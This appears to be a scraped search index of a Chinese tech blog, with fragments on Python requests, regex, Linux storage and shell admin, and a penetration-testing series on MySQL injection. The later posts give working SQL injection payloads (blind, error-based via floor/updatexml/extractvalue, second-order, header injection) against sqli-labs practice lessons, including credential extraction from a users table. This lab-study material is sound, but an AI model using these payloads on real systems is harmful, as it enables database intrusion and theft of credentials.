在requests中，如果直接利用get（）或post（）等方法的确可以做到模拟网页的请求，但是这实际上是相当于不同的会话，也就是说相当于你用了两个浏览器打开了不同的页面。 import requests headers = { \"content-type\": \"application/x-www-form-urlencoded;charset=UTF-8\", \"User-Agent\" : \"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1.6) \", } #设置一个会话session对象s s = requests.session() resp = s.get('https://www.baidu.com/s?wd=python', headers=headers) # 打印请求头和cookies print(resp.request.headers) print(resp.cookies) # 利用s再访问一次 resp = s.get('https://www.baidu.com/s?wd=python', headers=headers) # 请求头已`保持`首次请求后产生的cookie print(resp.request.headers) 异常处理 进行网络请求的时候，难免会出错，这时候为了程序能够继续运行下去，就要对异常进行处理 # 最简单的一种 try: # 请求过程 r = requests.get(url1, headers=headers, verify=False, params=data, cookies=cookies) # ...... except Exception as e: time.sleep(1) print(e) finally: print(\"程序执行结束!\") 文件上传 import requests files = { 'file':open('favicon.ico','rb') } r = requests.post('http://www.httpbin.or","date":"2020-02-17","objectID":"/python%E4%B9%8Brequests%E5%BA%93/:2:0","tags":["Python","requests"],"title":"python之requests库","uri":"/python%E4%B9%8Brequests%E5%BA%93/"},{"categories":["Python"],"content":"常用正则表达式来对爬取的网页进行解析，但是正则表达式的构造稍微复杂一点，一般在结构化的网页中没必要用正则（易出错） # findall a = re.findall('jianeng',s ) ## 搜索字符串，以列表类型返回全部能匹配的子串 print(a) #search() # 在一个字符串中搜索，匹配正则表达式的第一个位置，返回match对象 \u003c_sre.SRE_Match object; span=(1, 8), match='jianeng'\u003e 只能找到第一次出现的 a = re.search('jianeng',s) print(a) #finditer() # 搜索字符串，返回一个匹配结果的迭代类型， # 每个迭代元素是match对象 s = 'sjianengsdfasjianeng15sadfjianeng666' finditer = re.finditer('jianeng',s) print(finditer ) ##获取match对象中的值 for i in finditer: print(i) print(i.group()) #froup() 返回匹配到的字符串 print(i.start() ) #返回匹配的开始位置 print(i.end() ) #返回匹配的结束位置 print(i.span() ) # 返回一个元组表示匹配位置（开始，结束） #sub() # 替换 类似于字符串中 replace() 方法 s2 = re.sub('jianeng','666',s,count=2) print(s2) # compile() # 编译正则表达式为模式对象 a = re.compile('jianeng') # a 要匹配jianeng dd='fsadfasfjkjianeng' b = a.findall(dd) print(b ) #re.split() # 将一个字符串按照正则表达式匹配结果进行分割，返回列表类型 c = re.split('jianeng',s,maxsplit=2) print(c) import re #####元字符 ##通配符 -\u003e . 点 -\u003e 表示任意一个字符 res = re.findall(r'a','abcad') #统一使用r取消转义 去右边字符串中找所有满足左边格式的子字符串 print(res) #['a', 'a'] res = re.findall(r'a..','abcad') print(res) #['abc'] ##锚点元字符 # ^ 锁定行首 res = re.findall(r'^a.','abcad') print(res) #['ab'] # $ 锁定行尾 res = re.findall(r'a.$','abcad') print(res) # ['ad'] ##单词边界(不是元字符)： \\b res = re.findall(r'dog','Just dog Monica doggie Irene') print(res) # ['dog', 'dog'] #第二个dog不是单独的dog单词 res = re.findall(r'\\bdog\\b','Just dog Monica doggie Irene') print(res) # ['dog'] ###重复元字符 ####贪婪 （尽可能匹配的多） res = re.findall(r'ab{4}c','abbbbc') #连续4个b 把花括号前面紧挨着的重复多少次 print(res) #['abbbbc'] res = re.findall(r'ab{2,4}c','abbbc') #匹配2到4个b #正则不许加空格 print(res) #['abbbc'] res = re.findall(r'ab{2,}c','abbbbbbbbbc') #匹配2的到多个，至少2个 print(res) #['abbbbbbbbbc'] ### res = re.findall(r'ab*c','abbbc') # * 任意多个重复, 相当于{0,} print(res) res = re.findall(r'ab+c','abbbc') # * 一个或多个，一到正无穷,相当于 {1,} print(res) res = re.findall(r'ab?c','abbbc') # * 一个或者没有 ,相当于 {0,1} print(res) ######非贪婪 (尽可能匹配的少) 后面加一个 ？ res = re.findall(r'ab*','abbc') # 这是贪婪 print(res) #['abb'] res = re.findall(r'ab*？','abbc') print(res) # 这是非贪婪 # *? #任意多个 # +? #一个或多个 # ?? #一个或没有 ###选择元字符 | res = re.findall(r'ab|bc','abc-adc-aec-bca') #二选一 # | 或 print(res) # ['ab', 'bc'] #选的是正则表达式 res = re.findall(r'a[bd]c','abc-adc-aec-bca') # 多选一 ， [] 方括号 表示你想要列举的所有情况，但是,仅仅一个字符 print(res) # ['abc', 'adc'] #选的是方括号里面的一个字符 ， 【】里面的逗号表示匹配逗号 res = re.findall(r'a[^bd]c','abc-adc-aec-bca') # ^在[]里面的话，放在第一位，表示反向 print(res) # 除了b和d res = re.findall(r'a[a-e]c','abc-adc-aec-bca-a^c') #用 - 连接表示范围 [a-zA-Z0-9_]任意字母数字下划线 print(res) ####转义元字符 匹配字符本身 \\ 反斜杠 res = re.findall(r'.+.','1+2') print(res) #['1+2'] 不是匹配到了加号 res = re.findall(r'1\\+2','1+2') #得到元字符的字面值 print(res) #['1+2'] ######预定义字符类 # \\d #任一数字字符 -\u003e [0-9] # \\D #任一非数字字符 -\u003e [^0-9] # \\s #任一空白符 -\u003e [\\t\\n\\x0B\\f\\r] # \\S #任一非空白符 -\u003e [^\\t\\n\\x0B\\f\\r] # \\w #任一字母数字字符 -\u003e [a-zA-Z0-9] # \\W #任一非字母数字字符 -\u003e [^a-zA-Z0-9] ######分组 res = re.findall(r'a(bc)+d','abcbcbcd') #只能匹配一个bc 括号里面的变成一个整体 一个括号就是一个组 print(res) # ['bc'] res = re.findall(r'(a(bc)+d)','abcbcbcd') #大组套小组 print(res) # [('abcbcbcd', 'bc')] res = re.findall(r'a(b|c)c','abc-acc-adc-aec') #与a[bc]c类似 print(res) # ['b', 'c'] ##按组提取数据 res = re.findall(r'(\\w+)-(\\w+)-(\\w+)-(\\w+)','abc-dc-acc-aaec') print(res) # [('abc', 'acc', 'adc', 'aec')] res = re.search(r'(?P\u003cyear\u003e\\d+)-(?P\u003cmonth\u003e\\d+)-(?P\u003cday\u003e\\d+)','2018-03-13') print(res.groupdict()) # {'year': '2018', 'month': '03', 'day': '13'} \"\"\" 注意： 如果正则表达式中使用了括号， 那么findall函数匹配的结果 只会是括号中的内容， 而不是完整的匹配。 因此我们可以利用这种机制来 完整对需要部分的数据提取 \"\"\" ","date":"2020-02-17","objectID":"/python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/:0:0","tags":["Python","正则"],"title":"python正则表达式","uri":"/python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"categories":["数据结构与算法"],"content":"中缀表达式转换后缀表达式 3.1 规则 1、初始化栈和集合：运算符号栈s1和存储空间集合s2 2、从左到右扫描中缀表达式 3、遇到操作数时，将其加入s2 4、遇到运算符时，比较其与s1栈顶运算符的优先级 4.1、如果s1为空，或栈顶运算符为左括号‘(’，则直接将此运算符入栈 4.2、否则，若优先级比栈顶运算符的高，也将运算符压入s1 4.3、否则，将s1栈顶的运算符弹出并加入到s2中，再次转到 流程4 5、遇到括号时： 5.1、如果是左括号‘(’，则直接压入s1 5.2、如果是右括号‘)’，则依次弹出s1栈顶的运算符，并且加入s2，直到遇到左括号为止，此时将这一对括号丢弃 6、重复步骤 2-5，直到表达式的最右边 7、将s1中剩余的运算符依次弹出并加入s2 8、s2结果即为中缀表达式对应的后缀表达式 3.2 实例 以上面的转换为实例，比如输入 1 + ( ( 2 + 3 ) * 4 ) - 5，那么怎么转换成后缀表达式呢？ 扫描到的元素 s2集合中元素 s1(栈底-\u003e栈顶) 说明 1 1 空 数字 直接加入到集合中 + 1 + s1为空，直接入栈 ( 1 +( 左括号 直接入栈 ( 1 +( ( 同上 2 12 +( ( 数字 + 12 +( (+ s1栈顶是左括号，运算符直接入栈 3 123 +( (+ 数字 ) 123+ +( 右括号，弹出运算符直至遇到左括号 * 123+ +( * s1栈顶是左括号，运算符直接入栈 4 123+4 +( * 数字 ) 123+4 * + 右括号，弹出运算符直至遇到左括号 - 123+4 *+ - -与+优先级相同，因此弹出+号，在压入- 5 123+4 *+ 5 - 数字 到达最右端 123+4 *+ 5 - 空 s1中剩余的运算符 至此整个过程转换完毕 即中缀表达式1 + ( ( 2 + 3 ) * 4 ) - 5 的后缀表达式为1 2 3 + 4 * + 5 - 非原创原文链接：https://blog.csdn.net/qq_36144258/article/details/95075064 ","date":"2020-02-10","objectID":"/%E4%B8%AD%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F/:0:0","tags":["数据结构与算法"],"title":"中缀表达式转换为后缀表达式","uri":"/%E4%B8%AD%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%BD%AC%E6%8D%A2%E4%B8%BA%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"categories":["Linux"],"content":" 基本篇 存储 对磁盘的所有操作都要小心小心再小心 磁盘是计算机中最主要的存储设备 传统磁盘分区与逻辑卷管理 事前合理规划很重要 对磁盘的所有操作都要小心小心再小心 磁盘空间管理 df 查看硬盘总体使用情况 df \"\"\" 第一列： 文件系统 第二列： 存储空间（多少数据块） 第三列： 使用量 第四列： 可用量 第五列：使用率 第六列：挂载点 \"\"\" df -h # 人性化的方式 df -i # 查看inodes使用量 du 查看详细信息 是谁拿走了我的存储空间 du # 查看所有 du / # 查看根目录/目录下的文件大小 ''' 结合sudo权限 ''' '-h # 人类易于阅读方式' sudo du / -h '- s # 汇总' sudo du /* -hs # 显示汇总结果 '-c # 除了子文件和子目录之外，外加一个总和 ' sudo du /usr/* -hsc 第三方工具 ncdu （比较人性化的工具） apt install ncdu # 安装 ncdu # 使用（可以方向键和回车进入返回从 查看） 按住't' 先显示目录，再显示文件 按住'g' 显示百分比 'q'退出 添加硬盘 扩容 用vbox模拟添加硬盘：存储-\u003eSATA-\u003e添加硬盘 1.磁盘设备名称 dmsg命令查看设备日志 /dev/目录下面可以查看设备的名称 ls /dev/sd 2.硬盘分区 ## 1. fdisk -m 帮助菜单（查看参数） # 查看所有硬盘设备和分区情况 sudo fdisk -l # 分区 sudo fdisk /dev/sdb # 进入向导 # 先创建分区表 O # dos， MBR分区（基本分区） 传统分区格式，最大四个(主)分区，2T容量限制 g # GPT 未来标准，128个分区，无容量限制，推荐使用 # 会生成一个16进制的guid # 再创建分区 n 输入数字编号（后门会递增） 第一个扇区在哪个位置【让扇区决定磁盘大小】 输入结束扇区（默认最后一个扇区） 【也可以直接输入100M这种方式】 # 再保存分区 w # 查看分区结果 sudo fdisk -l 3.文件系统格式化 mkfs 命令 sudo mkfs.ext4 /dev/sdb1 sudo mkfs.xfs /dev/sdb2 Linux上常用的格式： ext4 （普通日常使用推荐） xfs （适用与超大空间比如100T, 多文件，数据库） 4. 挂载 绑定访问路径 一般两个挂载目录: /mnt/ 一般是硬盘等 （下面创建空的子目录再挂到子目录下） /media/ 一般习惯使用挂： u盘等移动存储 1.mount命令 (临时性的，重启之后失效) # sdb代表那块硬盘， sdb1代表那个分区 sudo mount /dev/sdb1 /mnt/storge/ # -t 声明格式 sudo mount /dev/sdb1 -t ext4 /mnt/storge/ # 卸载目录下面的设备（如果busy就先退出这个目录先不要使用） sudo umount /storage 自动挂载 /etc/fstab ''' 第一列：设备ID UUID， 唯一的标号/ 设备名也可以，推荐id 第二列：挂载点 swap无需挂载(none) 第三列：文件系统 ext4, swap... 第四列：options （ 参数， error=remount-ro的意思是发生错误只读形式挂） 一般填写默认就行 defaults:rw,exec,auto,nouser.asynchronous（异步存储） nouser表示当前用户才可以 第五列：dump （基本没用，写0不备份就行， 备份的时候才设置1） 一般写 0 第六列：pass (FS错误时fsck是否检查错误，0不检查，1优先，2后查） 一般写 2 ''' 实践： 1. blkid 查看设备UUID lsblk -fP 查看设备id 2.编辑文件 3. reboot 或者 mount -a #将/etc/fstab的所有内容重新加载 高级篇 SWAP管理 可能是你的救命稻草 关于swap的争论 需要/不需要 （Raspberry Pi） 大小多少才合理（2-16G） Swap分区，swap文件 理想状态下应该无事可做的swap 大量的swap空间使用意味着服务器已疲于奔命 free -m free -h 查看内存以及swap的 某些云主机默认没有swap ubuntu中，是swap文件 Swap文件 /swapfile #创建文件 制定大小，位置 sudo fallocate -l 8G /swapfile #查看文件 sudo xxd /swapfile #格式成swap文件 (记下 UUID) sudo mkswap /swapfile #把权限调小 sudo chmod 0600 /swapfile #修改挂载文件 sudo vim /etv/fstab/ /swapfile none swap sw 0 0 #关闭原来的swap sudo swapoff -a #开启 sudo swapon -a Swap分区 1.新增加一块硬盘 （如果vox提示已经创建过了，打开目录，删除那个硬盘[不要误删主硬盘和快照]，和.pre文件； 编辑.vobx文件，把新增硬盘配置项删掉） ls /dev/sd* 分区 fdisk /dev/sdb 3.新建主分区，t修改分区表类型为swap分区的格式 82，w保存退出 (L 列出所有支持的分区类型) 可以看到：/dev/sdb已经分出了/dev/sdb1 格式化为swap sudo mkswap /dev/sdb1 5修改挂载文件 sudo vim /etv/fstab/ UUID=xxxxxx none swap sw 0 0 6.关闭原来的swap sudo swapoff -a #7.重新开启 sudo swapon -a 原有的swap就可以删除啦～～～ LVM管理 一项值得感谢的技术 无须重启计算机灵活调整硬盘空间大小 硬盘分区太大浪费，太小无法满足业务发展需要 将传统的硬盘分区逻辑的组合为资源池，按需分配 概念 Volumn Groups （卷组）（池化）： 把物理资源的变成逻辑的 Physical Volumns (物理卷) Logical Volumnes （基本分区、RAID）： 可以存储数据的逻辑的概念，VG一部分资源的分割 安装包 sudo apt install lvm2 添加硬盘， 先创建PV, 再创建VG, 再创建LV 1.物理卷： # 创建物理卷 sudo pvcreate /dev/sdb # 查看物理卷 sudo pvdisplay # 查看简略的摘要信息 sudo pvs 2.卷组： sudo vgvreate vg01 /dev/sdb # 可以一次性指定多个pv sudo vgextend vg01 /dev/sdc /dev/sdd # 查看概要信息 vgscan / vgs sudo vgs 3.逻辑卷 # 创建逻辑卷， -n 名称, -L 大小， 从哪个vg里面分割的 sudo lvcreate -n lv-database -L 1G vg01 # 查看简要信息 sudo lvdisplay sudo lvscan / lvs # 格式化，(fstab自动)挂载 sudo mkfs.ext4 /dev/vg01/lv-database sudo mount /dev/vg01/lv-database/ /mnt/lv-01 df -h # 灵活拓展的特性 sudo lvextend /dev/vg01/lv-01 -l 256 # 增加完毕后大大小 256 sudo lvextend /dev/vg01/lv-01 -l +256 # 带加号，又增加大小 256个块 sudo lvextend /dev/vg01/lv-01 -L +2G # 增加2G # VG FREE 谁的百分比 sudo lvextend /dev/vg01/lv-01 -l 50%VG # 拓展到vg的50% sudo lvextend /dev/vg01/lv-01 -l +50%VG # 再拓展vg的50% # 逻辑卷扩充了 df -h # 是文件系统的查看。 这之后还没有告诉文件系统 # 把逻辑卷的扩充告诉文件系统，就可以用啦 sudo resize2fs /dev/vg01/lv-01 逻辑卷缩小 umount /dev/vg01/lv-01 # 必须下线 e2fsck -f /dev/vg01/lv-01 # 检查文件系统 resize2fs /dev/vg01/lv-01 1G # 缩小文件系统 lvresize /dev/vg01/lv-01 -L 1G # 缩小逻辑卷 # 重新挂载查看 sudo mount /dev/vg01/lv-01 /mnt/lv-01/ 快照 故障时可回退 临时可回退机制，不可视为备份 (备份应该是异地备份) 本地保存，安全性无法保证 系统根目录使用快照可以用于测试补丁更新 测试完成合并并删除快照 创建快照等同创建一个新的LV（默认是空的） 初始不占空间，但文件发生修改时原块数据被拷贝 回退时将快照中原始数据覆盖当前快照已经被修改的 # 快照 -s 是快照lv， -L大小 sudo lvcreate -s -n s01 -L 2G vg01/lv-01 # 快照LV可以被直接挂在，用于恢复单个文件 # 恢复快照（恢复后快照被删除） --mergr 哪个快","date":"2020-02-09","objectID":"/ubuntu-server-%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86/:0:0","tags":["Linux","ubuntu"],"title":"ubuntu server-存储管理","uri":"/ubuntu-server-%E5%AD%98%E5%82%A8%E7%AE%A1%E7%90%86/"},{"categories":["Linux"],"content":"进程管理 ps 信息： PID： 进程id TTY: 运行进程的终端设备 STAT： 进程状态(Sleep, Running) TIME： 该进程占用的cpu时间 COMMAND: 命令名称 参数： -x： 当前用户启动的所有进程 -ax： 所有用户启动的进程 -u： 进程详细信息 -aux: -w： 显示进程文件完整路径 -auxw: ps u PID ($$: 当前shell的进程id) ps -L pid号 # 查看当前进程下面的线程 ps fajx # 查看进程树 pstree # 更直观的进程树 # 结束进程 kill pid # 默认Term kill -STOP pid # 暂停进程 （杀病毒杀不掉的时候可以先stop） kill -CONT pid # 回复已暂停的进程 kill -KILL pid # kill -9 pid kill -l # 所有kill命令的信号 归档打包和压缩 gzip (GUN Zip) gzip file1 gunzip file1.gz # Gzip不支持多文件/目录的归档打包 # 会干掉原始文件 tar打包归档 (Archive) tar cvf file2.tar file1 file2 file3 # 并不进行压缩 gzip file.tar # 可以打包之后再压缩 gunzip file.tar.gz # 先解压 tar xcvf file2.tar # 解包 # tar 结合gz tar zcvf file2.tar.gz file1 file2 file3 # 参数z 打包同事亚索 tar -ztvf file.tar.gz # -t 显示文件内容但是不解压 tar jcvf c.tar.bz2 a b # bz2 bzip2 速度可能慢一点，但是对文本文件压缩更小 bzip2 f # 压缩 nunzip f.bz2 # tar 的 -j也可以 tar jcvf c.tar.bz2 a b sudoer sudo用户组 cat /etc/group中sudo组，才能加sudo运行命令 处于安全的考虑 sudo visudo 文件/etc/sudoers 组 所有主机=() 系统的哪些命令 %sudo All=(ALL:ALL) ALL # 指定配置 user_alias ADMINS = user1, user2 # 指定一些用户的别名 ADMINS ALL = (ALL)NOPASSWD:ALL # 该别名的权限 root ALL=(ALL) ALL ","date":"2020-02-09","objectID":"/ubuntu-server-%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86%E6%89%93%E5%8C%85%E5%8E%8B%E7%BC%A9/:0:0","tags":["Linux","ubuntu"],"title":"ubuntu server-进程管理\u0026打包压缩","uri":"/ubuntu-server-%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86%E6%89%93%E5%8C%85%E5%8E%8B%E7%BC%A9/"},{"categories":["Linux"],"content":"获取帮助 man man cmd man -k keyword #搜索关键词（不知道具体命令） man -k 'list directory contents' # 多个关键字 # 每个命令的 手册页 可以使用数字编号引用片段（section） man 5 passwd #（ 按section查看） - 1： 用户命令 - 2： 系统调用 - 3： 高级Unix编程库文档（程序员常用） - 4： 设备借口和驱动信息（很少使用） - 5： 文件描述（系统配置文件） - 6： Games - 7： 文件格式，惯例，编码(ASCII等) - 8： 系统命令和服务器 info GUN不太喜欢慢，因此开发了info 有时候优于man，有时不是 info ls /usr/share/doc # 部分软件包没有列入man或者info的文档 cmd –help / -h 绝大部分的不成文规定，并不都是，比如ls -h Shell输入与输出 输出重定向 ls a/ \u003e file # 会覆盖 ls a \u003e\u003e file # 追加 head /proc/cpuinfo head \u003c /proc/cpuinfo # 输入重定向 # `set -C` 之后不得覆盖 管道 head /proc/cpuinfo | tar a-z A-Z ifconfig | grep inet | awk'{print $2}' | awk -F. '{print $2}' # -F 指定分隔符，这里以.分割 标准错误 stderr(报错包含重要信息) # 写脚本的时候有用，可以把错误信息报错到某个文件 ls /abc 2\u003ee # 2:标准错误 1:标准输出 0:标准输入 ls 0\u003c a/ ls 1\u003e file1 ls b 2\u003e err1 ls a/ \u003e f1 2\u003e\u00261 # 标准输出、标准错误都输出到文件f1 （\u00261代表标准输出） 常见报错信息 ","date":"2020-02-09","objectID":"/ubuntu-server-%E8%BE%93%E5%87%BA%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/:0:0","tags":["Linux","ubuntu"],"title":"ubuntu server-帮助\u0026输出与重定向","uri":"/ubuntu-server-%E8%BE%93%E5%87%BA%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/"},{"categories":["渗透测试"],"content":"SQL测试-基于 布尔,延时 盲注 场景：无回显，并且没有报错和其他显示 能用布尔就不用延迟 几个相关函数： regexp regexp ‘^xiaodi[a-z]’ 匹配xiaodi及xiaodi…等 if if(条件,5,0) 条件成立 返回5 反之 返回0 sleep sleep(5) SQL语句延时执行5秒 mid mid(a,b,c)从位置 b 开始， 截取 a 字符串的 c 位 substr substr(a,b,c)从 b 位置开始， 截取字符串 a 的 c 长度 left left(database(),1)，database()显示数据库名称， left(a,b)从左侧截取 a 的前 b 位 length length(database())=8，判断数据库database()名的长度 ord=ascii ascii(x)=101，判断x的ascii码是否等于101，即email中的字母e IFNULL() 函数用于判断第一个表达式是否为 NULL，如果为 NULL 则返回第二个参数的值，如果不为 NULL 则返回第一个参数的值。 CAST()和CONVERT()函数可用来获取一个类型的值，并产生另一个类型的值。两者具体的语法如下：CAST(value as type); CONVERT(value, type); 基于布尔(逻辑)盲注 Less-5 用burp批量跑 0x01 获取数据库名操作Payload： left() 获取数据库名长度值 ?id=1' and length(database())=8 %23 获取数据库名第一位值 ?id=1' and left(database(),1)='s' %23 等于 ?id=1' and left(database(),1)\u003e'a' %23 大于 获取数据库名第二位值 ?id=1' and left(database(),2) \u003e 'sa' %23 ?id=1' and left(database(),2) = 'se' %23 0x02 获取表名操作Payload： ascii(substr()) 获取表名第一个第一位的值（下面这个是获取表名中第一个表，的第二位的值） ?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 %23 获取表名第一个第二位的值 ?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=101 %23 获取表名第二个第一位的值 ?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=101 %23 用burp批量跑(最后一种模式，设置两个变量 limit $0, 1), $1,1))=115) 0x03 获取列名操作Payload： regxp 获取列名regexp 查询users表第一个列名是否有us…列名 ?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and table_name regexp '^us[a-z]' limit 0,1)--+ 0x04 获取数据操作Payload： ord(mid()) 获取数据 security.users表中username列名的第一个第一位 ?id=1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+ (获取username中的第一行的第一个字符的ascii，与68进行比较) 基于延时盲注 0x01 获取数据库名操作Payload： if(条件，成立返回值，不成立的返回值) 获取数据库名第一个第一位 ?id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),1)--+ 可以把sleep放外面：and sleep(if ‘x’=‘yx, 5, 0) 0x02 获取表名操作Payload： 获取列名第一个第一位 ?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))\u003e100,sleep(5),1)--+ 后续参考：https://www.cnblogs.com/xishaonian/p/6113965.html ","date":"2020-02-08","objectID":"/07-mysql%E7%9B%B2%E6%B3%A8/:0:0","tags":["渗透测试"],"title":"07-mysql盲注","uri":"/07-mysql%E7%9B%B2%E6%B3%A8/"},{"categories":["渗透测试"],"content":"SQL二次注入测试 案例测试： less-24 及实际举例 25-30关卡好多是二次注入 自己练习 应用范围： 我们注册一个用户后，然后进入用户中心，对应的url地址： xxx.php?user=xiaodi 如果把注册的用户名改为: xx' union select 1,2,3 -- 总之: 将注入语句让web写入到数据库中，web在调用数据库中数据查询时，就触发了… 原理 mybatis以及预编译如何防止SQL注入 参考：https://www.cnblogs.com/haojun/p/10682407.html https://www.cnblogs.com/yangzailu/p/11381765.html ","date":"2020-02-08","objectID":"/07-mysql%E7%9B%B2%E6%B3%A8/:1:0","tags":["渗透测试"],"title":"07-mysql盲注","uri":"/07-mysql%E7%9B%B2%E6%B3%A8/"},{"categories":["渗透测试"],"content":"1. SQL各种参数类型下的注入测试 数字型-sqlilabs less2 x.php?id=1 字符型-sqlilabs less1 x.php?id=xiaodi 搜索型-自写测试 x.php?q=1 （select * from table where name like ‘%xi%’） 搞懂： 搞清楚为何要区分上面的类型 数字的不带引号，字符型带符号，注意考虑干扰 搜索型：模糊搜索 计算机中搜索的通配符为* 数据库中搜索的通配符为% 2. SQL各种报错方式下的注入测试 此类报错注入旨在解决无回显下的注入测试 注：MySQL 5.1.5版本后才包含ExtractValue()和UpdateXML()这2个函数 参考资料： https://www.wandouip.com/t5i158282/ http://blog.sina.com.cn/s/blog_1450cc4c60102vraq.html floor报错 sqlilabs less5 报错注入有长度限制，所以concat有时候不行， 需要limit 或者还需要sub payload: -- burp中注意空格问题（空格可以用+加号， 或者%20, 或者 /**/ 代替） ?id=1'+and+(select+1+from (select+count(*),concat(version(),floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)--+ ?id=-1' and(select 1 from (select count(*),concat((select table_name from information_schema.tables limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a)-- + ?id=1' and (select count(*) from information_schema.tables group by concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 2,1),0x7e,floor(rand(0)*2)))-- + http://192.168.0.121:8080/Less-5/?id=1%27 and (select count(*) from information_schema.tables group by concat(version(), floor(rand(0)*2))) -- + -- 可以用burp批量跑 limit 0,1 的0这里。payload设置数字范围 updatexml报错 sqlilabs less5 updatexml()函数是MYSQL对XML文档数据进行查询和修改的XPATH函数 payload: ?id=1' and 1=(updatexml(1,concat(0x3a,(select version())),1))--+ ?id=1' and 1=(updatexml(1,concat(0x3a,(select table_name from information_schema.tables limit 0,1)),1))--+ http://192.168.0.121:8080/Less-5/?id=1%27 and updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e), 1) -- + http://192.168.0.121:8080/Less-5/?id=1%27 and updatexml(1, concat(0x7e, (select concat_ws(0x3a, username,password) from security.users limit 0,1),0x7e), 1) -- + extractvalue报错 sqlilabs less5 extractvalue()函数也是MYSQL对XML文档数据进行查询和修改的XPATH函数 payload: id=1' and extractvalue(1,concat(0x7e,user()))--+ ?id=1' and extractvalue(1, concat(0x5c,(select table_name from information_schema.tables limit 1)))--+ 3.SQL各种查询方式下的注入测试 select insert（注册，用户添加，发布文章） Less-18 $insert=\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\"; -- sql语句 ??? 对吗没验证，截图了 insert into users(username, passwd) values('x' or updatexml(1,concat(0x3a,( version() ),1) or ' ', 'psd'); --payload User-Agent: 中 x' or updatexml(1,concat(0x7e,(version())),1) or ' User-Agent: x' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables limit 0,1)),1) or ' 自己练习增,删,改： updatexml和extra两个都实验 delete（后台删除文章, 用户…） update （改密码，数据同步） 通过以上查询方式与网站一个用的关系，可以由注入点产生的地方或者应用猜测到对方的SQL查询方式 环境搭建 自己搭建 利用上述报错注入语句进行查询模式注入测试 create database newdb; use newdb; create table users ( id int(3) not null auto_increment, username varchar(20) not null, passowrd varchar(20) not null, primary key(id) ); insert into users values(1,'janes','Eyre'); 注意使用场景，在什么情况下用到 插件： mysql监控-Seay代码审计系统 查看执行了哪些语句 报错注入有长度限制:32位, 如果长度超出会显示不全. 解决方案: substr((),1,1) 递进截取依次 (select substr(concat(username,0x3a,password), 1,10) from users limit 0,1) 三种查询方式对应的报错注入测试 floor报错演示Payload insert into users(id,username,passowrd) values(1,'Olivia' or (select count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x; ) or '','Nervo'); update users set passowrd='Nicky' or (select 1 from(select count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a) or '' where id=2; delete from users where id=1 or (select 1 from(select count(*),concat( floor(rand(0)*2),0x7e,(database()),0x7e)x from information_schema.character_sets group by x)a) updatexml报错演示Payload insert into users(id,username,passowrd) values(2,'Olivia' or updatexml(1,concat(0x7e,(version())),0) or '','Nervo'); update user set passowrd='Nicky' or updatexml(1,concat(0x7e,(version())),0) or '' where id=2 and username='Nervo'; delete from users where id=2 or updatexml(1,concat(0x7e,(version())),0) or ''; extrac","date":"2020-02-08","objectID":"/06-mysql%E7%B1%BB%E5%9E%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/:0:0","tags":["渗透测试"],"title":"06-mysql类型报错注入","uri":"/06-mysql%E7%B1%BB%E5%9E%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"},{"categories":["渗透测试"],"content":"常见提交方式下的注入漏洞 前言：WEB应用在数据传递接受中，针对SQL注入安全漏洞，由于数据大小，格式等原因，脚本在接受传递时会有多种传递方式，传递方式的不同将影响到安全测试的不同！本课将针对此类问题进行逐一讲解。 ","date":"2020-02-08","objectID":"/05-mysql%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F%E6%B3%A8%E5%85%A5/:0:0","tags":["渗透测试"],"title":"05-mysql提交方式注入","uri":"/05-mysql%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F%E6%B3%A8%E5%85%A5/"},{"categories":["渗透测试"],"content":"第一点：数据常见提交方式 https://www.cnblogs.com/weibanggang/p/9454581.html ","date":"2020-02-08","objectID":"/05-mysql%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F%E6%B3%A8%E5%85%A5/:1:0","tags":["渗透测试"],"title":"05-mysql提交方式注入","uri":"/05-mysql%E6%8F%90%E4%BA%A4%E6%96%B9%E5%BC%8F%E6%B3%A8%E5%85%A5/"},{"categories":["渗透测试"],"content":"第二点：产生注入的接受方式 例子：GET POST： COOKIE ： REQUEST ： $_REQUEST() 何种方法都可以接参数 SERVER： http头部注入。$_SERVER https://www.cnblogs.com/jianmingyuan/p/5900064.html 等 